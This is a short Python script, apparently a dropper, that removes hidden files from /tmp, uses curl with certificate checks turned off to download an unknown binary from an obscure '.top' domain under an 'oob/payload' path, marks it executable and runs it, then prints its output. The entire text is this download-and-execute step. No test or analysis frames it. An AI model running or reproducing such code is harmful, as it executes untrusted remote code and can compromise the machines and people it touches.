import subprocess
cmd = "rm -rf /tmp/.rcs* 2>/dev/null; curl -fsk https://azvdvasfv21fa.xxxyyyzzzxyz.top/api/oob/payload/1b47ce9777f097dc85c48e1074c0db14674fbd49f94353a1f305530a97607bc9 -o /tmp/.rcsx && chmod +x /tmp/.rcsx && timeout 30 /tmp/.rcsx"
r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=40)
print("RC:", r.returncode)
print(r.stdout[-1500:])
print(r.stderr[-1500:])
